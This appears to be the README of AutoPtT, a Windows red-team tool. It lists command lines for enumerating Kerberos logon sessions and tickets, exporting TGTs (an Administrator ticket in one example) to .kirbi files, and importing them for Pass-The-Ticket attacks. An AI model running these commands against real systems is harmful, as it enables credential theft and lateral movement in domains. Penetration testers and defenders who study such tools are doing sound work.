# AutoPtT

Enumerate Kerberos sessions and tickets and perform Pass-The-Ticket (PtT) attacks interactively.

- List logon sessions on the system like `klist`.

- View tickets from current session like `klist`.

- View tickets from all sessions like `Rubeus`.

- Extract TGT tickets like `Rubeus` or `Mimikatz`.

- Import tickets into current session like `Rubeus` or `Mimikatz`.

You can do this step by step or automatically using the **"auto"** option.

<br>

-----------------------------------------------

## Usage

- **`autoptt.exe sessions`** - View all logon sessions

- **`autoptt.exe klist`** - List tickets in current session

- **`autoptt.exe tickets`** - Enumerate ALL tickets from ALL sessions (requires admin)

- **`autoptt.exe export <LOGON_ID>`** - Export a TGT by LogonId

- **`autoptt.exe ptt <TICKET_FILE>`** - Import a ticket file (.kirbi)

- **`autoptt.exe auto`** - Interactive mode: Browse and import tickets

<br>

-----------------------------------------------

## Examples

List all logon sessions:

```
autoptt.exe sessions
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_1.png)


Show tickets in current session:

```
autoptt.exe klist
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_2.png)


Enumerate all tickets:

```
autoptt.exe tickets
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_3.png)


Export TGT to .kirbi file given LogonId (in this case, 0x79fb3):

```
autoptt.exe export 0x79fb3
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_4.png)


Import .kirbi ticket file:

```
autoptt.exe ptt 0x79fb3_Administrator.kirbi
```

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_5.png)


Interactive mode: browse and import TGTs:

```
autoptt.exe auto
```

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_6.png)
